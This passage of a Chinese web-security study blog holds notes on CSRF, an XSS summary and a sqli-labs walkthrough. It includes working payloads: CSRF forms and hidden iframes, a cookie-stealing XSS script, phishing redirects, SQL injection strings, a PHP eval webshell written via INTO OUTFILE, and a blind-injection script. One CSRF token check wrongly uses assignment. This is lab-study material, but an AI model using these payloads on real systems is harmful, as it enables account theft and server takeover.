class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin_test&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin_test&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sub&quot;</span> <span class="attr">value</span>=<span class="string">&quot;OK&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;test&quot;</span> <span class="attr">value</span>=<span class="string">&quot;中奖了&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="CSRF探测及自动化"><a href="#CSRF探测及自动化" class="headerlink" title="CSRF探测及自动化"></a>CSRF探测及自动化</h3><p><strong>几种csrf防护手段</strong></p><blockquote><p>HTTP Referer 头验证</p><p>设置Token</p><p>HTTP自定义头</p><p>二次验证（指不仅进行后端认证，也进行前端认证，比如做修改密码操作时，弹出框提醒用户），验证码</p></blockquote><p>如果web应用程序的http请求中没有对应的预防措施，那么很大成度上就确定存在csrf漏洞</p><h4 id="CSRF自动化探测"><a href="#CSRF自动化探测" class="headerlink" title="CSRF自动化探测"></a>CSRF自动化探测</h4><p>采用CSRFTester，其原理相当于爬虫。采用agent 代理技术，抓取我们在浏览器中访问的所有连接以及所有表单，通过CSRFTester中修改表单的信息，重新提交，相当于一次伪造客户端请求，如果请求成功被服务器接收，则说明存在csrf漏洞。</p><p>Burpsuite自带自动生成 CSRFPOC 模块</p><h3 id="CSRF漏洞防御"><a href="#CSRF漏洞防御" class="headerlink" title="CSRF漏洞防御"></a>CSRF漏洞防御</h3><h4 id="利用token技术进行csrf漏洞防御"><a href="#利用token技术进行csrf漏洞防御" class="headerlink" title="利用token技术进行csrf漏洞防御"></a>利用token技术进行csrf漏洞防御</h4><p><strong>CSRF漏洞实质：服务器无法准确判断当前请求是否是合法用户的自定义操作</strong></p><p>Token作为识别当前用户自己操作的唯一凭证，需要设置为复杂难以破解的内容。 这里我给一个小demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateToken</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$salt</span>=<span class="string">&quot;test&quot;</span>.date(<span class="string">&quot;Y/m/d&quot;</span>);</span><br><span class="line">    <span class="variable">$token</span>=md5(<span class="variable">$salt</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$token</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>具体操作</p><blockquote><ol><li>登入验证成功之后，在会话SESSION[“user_token”]中保存token</li><li>在后台操作中，增删改表单中增添隐藏域hidden，设置value为Token</li><li>每次提交之后验证Token是否正确</li></ol></blockquote><p>写一个dome</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">token_generate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$salt</span>=<span class="string">&quot;hahahaha&quot;</span>.date(<span class="string">&quot;h:i:s&quot;</span>);</span><br><span class="line">        <span class="variable">$token</span>= md5(<span class="variable">$salt</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$token</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$token</span>= token_generate();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;user_token&quot;</span>]= <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;CSRF_TOKEN&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;CSRF_TOKEN&lt;/h1&gt;</span><br><span class="line">            &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;user_token&quot;</span> value=<span class="string">&quot;&lt;?php echo <span class="subst">$token</span>;?&gt;&quot;</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;s&quot;</span>&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>token验证的时候可以单独写一个函数,当处理一些敏感操作时进行 token验证</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">token_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$user_token</span>=<span class="variable">$_POST</span>[<span class="string">&quot;user_token&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;user_token&quot;</span>]=<span class="variable">$user_token</span>)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;successful&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;非法操作&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="CSRF-bypass-http-referer"><a href="#CSRF-bypass-http-referer" class="headerlink" title="CSRF bypass http_referer"></a>CSRF bypass http_referer</h3><blockquote><p>HTTP Referer 是header的一部分，当浏览器向web服务发送请求的时候，一般会带上Referer，告诉服务器从哪个页面链接来的，服务器基于此可以获得一些信息。</p></blockquote><p>在用于CSRF防御时，用户执行对应操作，提交的HTTP请求中有对应的Referer值，此时服务端判断Referer值是否与服务器器的域名信息相关，不相关则不允许执行操作</p><p>后端dome</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(strpos(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>],<span class="string">&#x27;xx.com&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们可以构造文件名绕过 例如 <code>http://target.com/xx.com/1.php</code></p><h3 id="CSRF-payload"><a href="#CSRF-payload" class="headerlink" title="CSRF payload"></a>CSRF payload</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://127.0.0.1/get_csrf/new_user.php?username=liuxiaoyang&amp;password=123456&quot;</span>&gt;</span>点击我<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/get_csrf/new_user.php?username=liuxiaoyang&amp;password=123456&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/get_csrf/new_user.php?username=liuxiaoyang&amp;password=123456&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>一种比较特别的攻击，利用 css中 backgroud 样式 中的url 加载远程机器上的内容，从而对url 中的内容发送http请求</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span></span><br><span class="line">&#123;</span><br><span class="line">    backgroud: <span class="number">#00FF00</span> <span class="built_in">url</span>(<span class="string">http://127.0.0.1/get_csrf/new_user.php?username=liuxiaoyang&amp;password=123456</span>) no-repeat fixed top;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS漏洞总结</title>
      <link href="2021/01/28/xss%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
      <url>2021/01/28/xss%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>笔者深入学习了XSS漏洞的成因 利用 绕过</p><span id="more"></span><h2 id="跨站脚本攻击XSS"><a href="#跨站脚本攻击XSS" class="headerlink" title="跨站脚本攻击XSS"></a>跨站脚本攻击XSS</h2><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><p>恶意攻击者往web页面中插入恶意javascript代码，当用户浏览此页时，嵌入其中web页面中的javascript代码会被执行，从而达到恶意攻击用户的目的</p><p><img src="/2021/01/28/xss%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/image-20210128120154200.png" class="lazyload" data-srcset="/2021/01/28/xss%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/image-20210128120154200.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210128120154200"></p><h3 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h3><h4 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h4><p>反射型xss又称为非持久型xss，攻击具有一次性</p><p>攻击者通过邮件形式将包含xss代码的构造连接发送个正常用户，当用户点击时，服务器接受该用户的请求并且处理，将带有xss payload的web页面发给用户。用户浏览器解析，触发该漏洞</p><h4 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h4><p>存储型xss又称为持久型xss，攻击脚本储存在服务器的数据库中</p><p>攻击者在论坛、博客、留言板中</p><p>发贴的过程嵌入xss代码，帖子被服务器存储在数据库中。用户正常访问时，会触发xss代码</p><h4 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h4><p>DOM全称Document Object Model，使用DOM动态访问更新文档的内容、结构以及样式。通过htmlDOM可以对DOM树上所有节点进行修改。服务器响应不会处理攻击者脚本，当用户浏览器处理这个响应时，dom对象处理xss代码，触发xss漏洞</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="利用xss漏洞盗取cookie"><a href="#利用xss漏洞盗取cookie" class="headerlink" title="利用xss漏洞盗取cookie"></a>利用xss漏洞盗取cookie</h4><blockquote><p>cookie：Cookie是在http协议下，服务器或者脚本维护客户工作站上信息的一种方式。服务器端利用cookies包含信息的任意性来筛选维护这些信息，用来判断在http传输中的状态。cookie最常用于会话令牌。</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">&#x27;http://127.0.0.1/xss/cookie.php?cookie=&#x27;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="利用xss篡改网页链接，实现引流"><a href="#利用xss篡改网页链接，实现引流" class="headerlink" title="利用xss篡改网页链接，实现引流"></a>利用xss篡改网页链接，实现引流</h5><blockquote><p>window.onload 窗口加载事件</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> link=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;a&quot;</span>);</span></span><br><span class="line">        for(j=0;j&lt;link.length;j++)&#123;</span><br><span class="line"><span class="javascript">            link[j].href=<span class="string">&quot;https://baidu.com/&quot;</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">#这里利用了一个匿名函数，当窗口加载时，使用for循环获取所有的a标签，更改a标签的href属性为攻击者想要跳转的站点</span><br></pre></td></tr></table></figure><p>利用kali里面的beef恶意链接生成，利用hook.js 执行其他命令</p><h4 id="利用xss盗取用户信息-盗号"><a href="#利用xss盗取用户信息-盗号" class="headerlink" title="利用xss盗取用户信息(盗号)"></a>利用xss盗取用户信息(盗号)</h4><p>克隆站点登陆页面，利用存储型xss设置跳转代码，如果用户访问即跳转到克隆网站的登录页面，用户输入账密登入，账号和密码都被储存下来</p><p>setookit工具克隆网站非常简单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.loaction=<span class="string">&quot;http://192.168.53.28/&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSS-bypass技巧-根据http-xss-quiz-int21h-jp-总结"><a href="#XSS-bypass技巧-根据http-xss-quiz-int21h-jp-总结" class="headerlink" title="XSS bypass技巧(根据http://xss-quiz.int21h.jp 总结)"></a>XSS bypass技巧(根据<a href="http://xss-quiz.int21h.jp/">http://xss-quiz.int21h.jp</a> 总结)</h3><ol><li><p>```html<br>“<script>alert(document.domain);</script><b>“</b></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. &#96;&#96;&#96;html</span><br><span class="line">   1&quot;&gt;&lt;script&gt;alert(document.domain);&lt;&#x2F;script&gt;&lt;&quot;</span><br><span class="line">   &quot; onclick&#x3D;alert(document.domain)&gt;</span><br><span class="line">   &quot; onmouseover&#x3D;alert(document.domain)&gt;</span><br></pre></td></tr></table></figure></li><li><p>选择列表中的xss  抓包分析</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p1=1&amp;p2=Japan&lt;/option&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>隐藏表单的xss </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p1=1&amp;p2=Japan&amp;p3=1&quot;&gt;&lt;script&gt;alert(xss)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>baypass maxlength长度限制 直接删掉maxlength属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;&quot;</span><br></pre></td></tr></table></figure></li><li><p>bypass 尖括号转义  通过事件处理器来绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(document.domain);&quot;</span><br></pre></td></tr></table></figure></li><li><p>bypass 空格分隔的xss 绕过属性值强制加引号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 onclick=alert(document.domain);</span><br></pre></td></tr></table></figure></li><li><p>利用javascript为协议进行绕过</p><blockquote><p>javascript 伪协议简介</p><p>将javascript代码添加得到客户端的方法是把它放置在伪协议说明符javascript:后的url中</p><p>这个伪协议声明了url的主体是任意的javascript代码，它由javascript的解释器运行。如果javascript:URL中的javascript打码</p><p>含有多个语句，必须使用分号分开。</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.domain);</span><br></pre></td></tr></table></figure></li><li><p>utf-7 绕过 （较为小众）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ACIAIABvAG4AYwBsAGkAYwBrACAAPQAgACIAIABhAGwAZQByAHQAKABkAG8AYwB1AG0AZQBuAHQALgBkAG8AbQBhAGkAbgApAA0AC-</span><br></pre></td></tr></table></figure></li><li><p>编码绕过 双写绕过 过滤关键字</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(atob(<span class="string">&quot;YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&quot;</span>));</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> web漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql-libs通关笔记</title>
      <link href="2021/01/15/sql-libs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
      <url>2021/01/15/sql-libs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>从去年入门时就玩过一段时间的sqli-labs，打通过10多关就没有坚持下来，后面的ctf做题中，其实发现自己对sql注入的掌握并不是尽如人意，重回靶场。未完待续！</p><span id="more"></span><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;-- +</span></span><br><span class="line"><span class="string">http://sqli/Less-1/?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(CONCAT(username,<span class="number">0x7e</span>,password)),<span class="number">3</span> <span class="keyword">FROM</span> users <span class="comment">-- +</span></span><br></pre></td></tr></table></figure><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-2</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span>  <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span>  <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;users&quot;<span class="comment">-- a</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-2</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span>  <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(concat(username,<span class="string">&#x27;~&#x27;</span>,password)),<span class="number">3</span>  <span class="keyword">from</span> users<span class="comment">-- a</span></span><br></pre></td></tr></table></figure><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-3</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;-- a&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-3</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,2,group_concat(concat(username,&#x27;</span><span class="operator">~</span><span class="string">&#x27;,password)) from users-- a</span></span><br></pre></td></tr></table></figure><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-4</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span>&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot;-- a</span><br><span class="line">http://sqli/Less-4/?id=-1&quot;) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(concat(username,<span class="string">&#x27;~&#x27;</span>,password)),<span class="number">3</span> <span class="keyword">from</span> users<span class="comment">-- a</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; || updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) and 1=&#x27;</span><span class="number">1</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; || updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),0x7e),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">#为了把数据截断的更全一些</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;|| updatexml(1,concat(0x7e,substr((select group_concat(column_name) From  information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),1,32),0x7e),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;|| updatexml(1,concat(0x7e,substr((select group_concat(concat(username,0x7e,password)) From  users),1,32),0x7e),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot;|| updatexml(1,concat(0x7e,substr((select group_concat(column_name) From  information_schema.columns where table_name=&#x27;users&#x27;),1,32),0x7e),1) or &#x27;1&#x27;=&quot;<span class="number">1</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-6</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot; || updatexml(1,concat(0x7e,substr((select group_concat(concat(username,0x7e,password)) From  users),1,32),0x7e),1) or &#x27;1&#x27;=&quot;<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><h4 id="outfile写入webshell"><a href="#outfile写入webshell" class="headerlink" title="outfile写入webshell"></a>outfile写入webshell</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-7</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union select 1,&quot;&lt;?php  @eval($_POST[&#x27;</span>cmd<span class="string">&#x27;]);?&gt;&quot;,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli\\less-7\\webshell1.php&quot; -- a  </span></span><br></pre></td></tr></table></figure><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><h4 id="最简单的bool盲注"><a href="#最简单的bool盲注" class="headerlink" title="最简单的bool盲注"></a>最简单的bool盲注</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">booler_injection</span>(<span class="params">url</span>):</span></span><br><span class="line">    str_head=<span class="string">&#x27;the_data_is:...&#x27;</span></span><br><span class="line">    py_dict=&#123;</span><br><span class="line">        <span class="string">&#x27;str1&#x27;</span>:<span class="string">&#x27;?id=1\&#x27; and ord(substr((select database()),&#123;0&#125;,1))=&#123;1&#125; -- +&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;str2&#x27;</span>:<span class="string">&#x27;?id=1\&#x27; and ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\&#x27;security\&#x27;),&#123;0&#125;,1))=&#123;1&#125; -- +&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;str3&#x27;</span>:<span class="string">&#x27;?id=1\&#x27; and ord(substr((select group_concat(concat(username,0x7e,password)) from users),&#123;0&#125;,1))=&#123;1&#125; -- 